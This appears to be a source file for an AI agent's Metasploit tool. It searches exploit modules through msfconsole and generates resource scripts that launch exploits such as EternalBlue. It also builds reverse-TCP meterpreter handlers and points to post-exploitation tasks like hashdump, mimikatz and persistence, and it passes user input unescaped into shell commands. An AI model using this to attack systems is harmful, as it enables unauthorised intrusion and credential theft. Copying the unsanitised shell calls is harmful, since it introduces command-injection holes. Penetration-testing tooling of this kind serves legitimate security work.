// Jarvis Cyber — Dynamic Metasploit Interface (uses msfconsole)
// No hardcoded module database — uses real msfconsole search for module discovery
import { execSync } from 'child_process';
import { toolInstaller } from '../tool-installer.js';

export const definition = {
  type: 'function',
  function: {
    name: 'metasploit_rpc',
    description: 'Interface with Metasploit Framework via msfconsole. Search modules dynamically, generate resource scripts, and build exploit/payload configurations. Uses real msfconsole search — no hardcoded module database.',
    parameters: {
      type: 'object',
      properties: {
        action: {
          type: 'string',
          enum: ['search', 'generate_rc', 'exploit_config', 'post_exploit', 'handler', 'info'],
          description: 'Action: search modules, generate .rc file, configure exploit, post-exploitation, create handler, or get module info',
        },
        query: { type: 'string', description: 'Search query or exploit module path (e.g., "exploit/multi/handler", "eternalblue", "type:exploit platform:windows smb")' },
        rhosts: { type: 'string', description: 'Target IP/range' },
        lhost: { type: 'string', description: 'Local/listener IP' },
        lport: { type: 'integer', description: 'Local port (default: 4444)' },
        payload: { type: 'string', description: 'Payload to use (e.g., "windows/meterpreter/reverse_tcp")' },
        options: { type: 'string', description: 'Additional options as Key=Value pairs, comma-separated' }
      },
      required: ['action']
    }
  }
};

export async function execute(args) {
  const { action, query, rhosts, lhost = '0.0.0.0', lport = 4444, payload, options } = args;

  switch (action) {
    case 'search':
      return _searchModules(query);
    case 'generate_rc':
      return _generateRC(query, rhosts, lhost, lport, payload, options);
    case 'exploit_config':
      return _generateRC(query, rhosts, lhost, lport, payload, options);
    case 'post_exploit':
      return _postExploit(query);
    case 'handler':
      return _generateHandler(lhost, lport, payload);
    case 'info':
      return _moduleInfo(query);
    default:
      return { success: false, error: `Unknown action: ${action}` };
  }
}

function _searchModules(query) {
  if (!query) {
    return { success: false, error: 'Search query required. Examples: "eternalblue", "type:exploit platform:windows smb", "cve:2021-44228"' };
  }

  // Use real msfconsole search if available
  if (_isInstalled('msfconsole')) {
    try {
      const cmd = `msfconsole -q -x "search ${query}; exit" 2>/dev/null | grep -E "^\\s+\\d+|exploit/|auxiliary/|post/" | head -30`;
      const output = execSync(cmd, {
        encoding: 'utf8',
        timeout: 60000,
        env: { ...process.env, TERM: 'dumb' },
      });

      const modules = _parseMsfSearchOutput(output);
      return {
        success: true,
        query,
        tool_used: 'msfconsole',
        results_count: modules.length,
        results: modules,
        note: modules.length > 0
          ? 'Use generate_rc action with the module path to create a resource script.'
          : 'No modules found. Try broader search terms.',
      };
    } catch {}
  }

  // Fallback: return msfconsole search command for the AI to run
  return {
    success: true,
    query,
    tool_used: 'command_template',
    note: 'msfconsole not available. Use execute_command to run:',
    command: `msfconsole -q -x "search ${query}; exit"`,
    install_hint: 'Install Metasploit: install_tool("metasploit-framework")',
  };
}

function _moduleInfo(query) {
  if (!query) return { success: false, error: 'Module path required' };

  if (_isInstalled('msfconsole')) {
    try {
      const cmd = `msfconsole -q -x "info ${query}; exit" 2>/dev/null | head -60`;
      const output = execSync(cmd, {
        encoding: 'utf8',
        timeout: 30000,
        env: { ...process.env, TERM: 'dumb' },
      });
      return { success: true, module: query, info: output.slice(0, 3000) };
    } catch {}
  }

  return {
    success: true,
    module: query,
    command: `msfconsole -q -x "info ${query}; exit"`,
    note: 'Run this command with execute_command to get module details.',
  };
}

function _parseMsfSearchOutput(output) {
  const modules = [];
  const lines = output.split('\n');

  for (const line of lines) {
    // Match: "  0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14  excellent  MS17-010 EternalBlue"
    const match = line.match(/\s*\d+\s+((?:exploit|auxiliary|post|payload|encoder|nop)\/\S+)\s+(\S+)\s+(\w+)\s+(.*)/);
    if (match) {
      modules.push({
        path: match[1],
        date: match[2],
        rank: match[3],
        description: match[4].trim(),
      });
    }
  }
  return modules;
}

function _generateRC(module, rhosts, lhost, lport, payload, options) {
  if (!module) return { success: false, error: 'module path required (e.g., "exploit/windows/smb/ms17_010_eternalblue")' };

  let rc = `# Jarvis Auto-Generated Metasploit Resource Script\n`;
  rc += `# Generated: ${new Date().toISOString()}\n\n`;
  rc += `use ${module}\n`;
  if (rhosts) rc += `set RHOSTS ${rhosts}\n`;
  if (lhost) rc += `set LHOST ${lhost}\n`;
  if (lport) rc += `set LPORT ${lport}\n`;
  if (payload) rc += `set PAYLOAD ${payload}\n`;

  if (options) {
    for (const opt of options.split(',')) {
      const [key, value] = opt.split('=').map(s => s.trim());
      if (key && value) rc += `set ${key} ${value}\n`;
    }
  }

  rc += `show options\n`;
  rc += `exploit\n`;

  return {
    success: true,
    rc_script: rc,
    run_command: `msfconsole -r exploit.rc`,
    note: 'Save this as exploit.rc and run with the command above. Or use execute_command to write and run it.',
  };
}

function _postExploit(query) {
  if (!query) {
    return {
      success: true,
      note: 'Specify a post-exploitation task. The AI should use msfconsole search or execute_command to find appropriate post modules.',
      hint: 'Common tasks: hashdump, mimikatz, persistence, pivot, escalate, enum. Use: msfconsole -q -x "search type:post <query>; exit"',
    };
  }

  // Use real msfconsole search for post modules
  if (_isInstalled('msfconsole')) {
    try {
      const cmd = `msfconsole -q -x "search type:post ${query}; exit" 2>/dev/null | head -20`;
      const output = execSync(cmd, { encoding: 'utf8', timeout: 30000, env: { ...process.env, TERM: 'dumb' } });
      const modules = _parseMsfSearchOutput(output);
      return { success: true, query, results: modules };
    } catch {}
  }

  return {
    success: true, query,
    command: `msfconsole -q -x "search type:post ${query}; exit"`,
    note: 'Run this command to find post-exploitation modules.',
  };
}

function _generateHandler(lhost, lport, payload) {
  const p = payload || 'windows/meterpreter/reverse_tcp';
  const rc = `use exploit/multi/handler\nset PAYLOAD ${p}\nset LHOST ${lhost}\nset LPORT ${lport}\nset ExitOnSession false\nexploit -j\n`;
  return { success: true, handler_rc: rc, run_command: 'msfconsole -r handler.rc' };
}

function _isInstalled(tool) {
  try {
    execSync(`command -v ${tool}`, { stdio: 'ignore', timeout: 3000 });
    return true;
  } catch { return false; }
}
